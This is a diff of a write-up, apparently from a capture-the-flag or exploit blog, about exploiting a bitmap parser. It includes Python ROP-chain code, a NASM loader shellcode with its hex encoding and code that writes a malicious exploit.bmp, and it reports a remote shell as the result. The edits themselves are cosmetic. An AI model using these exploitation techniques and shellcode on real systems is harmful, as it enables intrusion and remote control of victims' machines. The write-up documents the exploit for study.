@@ -179,7 +179,7 @@ over += pack(_data)
 
 Now we just need to write the shellcode at `.data` and jump to there. But because `copy_palette_402720` function zeros a byte every four byte of the payload, we cannot simply call `memcpy()` on the stack address. We had to use multiple ROP gadgets to write 3 bytes at a time.
 
-```
+```py
 def rop_put_str(where, what):
     what = what + '\0'*(3 - (len(what) % 3)) # Pad to 3-byte unit.
     rop = ''
@@ -196,8 +196,7 @@ over += rop_put_str(_data, 'abcdefghijklmnopqrstuvwxyz')
 
 But we could not send long reverse TCP shellcode (around 500 bytes) with this rudimentary method simply because stack was not large enough. So we only copied short "loader" shellcode this way. The loader shellcode below copies the real shellcode body from stack to `.data` section and then jumps to it.
 
-```asm
-; "9489c583c004bac8000000b930e05900bf04000000bb030000008b30893101f801d94a75f5be30e0590089ec".decode("hex")
+```nasm
 loader:
     xchg eax, esp
     mov ebp, eax
@@ -217,6 +216,10 @@ loop:
 
     mov esi, 0x59e030
     mov esp, ebp
+
+; Compiles to "9489c583c004bac8000000b930e05900bf04000000bb030000008b30893101f801d94a75f5be30e0590089ec".decode("hex")
+; Below were harmless null bytes (add  byte ptr [eax], al)
+; So the execution reaches the actual shellcode at 0x0x59e030
 ```
 
 ### 5. Shellcode and exploit
@@ -280,7 +283,6 @@ over += pack(0x40)          # perm = RWX
 over += pack(_data)         # must be writable pointer.
 over += pack(ret)*10        # consumed by pops and ret.
 
-
 ### Put loader code
 
 def rop_put_str(where, what):
@@ -299,7 +301,6 @@ over += rop_put_str(_data, loader.decode('hex'))
 over += pack(popesi)
 over += pack(_data)
 over += pack(callesi) # After call esi, esp + 4 points to the start of main shellcode.
-
 
 ### Put main shellcode
 
@@ -335,6 +336,6 @@ with open("exploit.bmp","wb") as f:
   f.write(b)
 ```
 
-The nwe have a remote shell like this.
+Then we have a remote shell like this.
 
 ![bmp_ex.png](/assets/2017/04/bmp_ex.png)
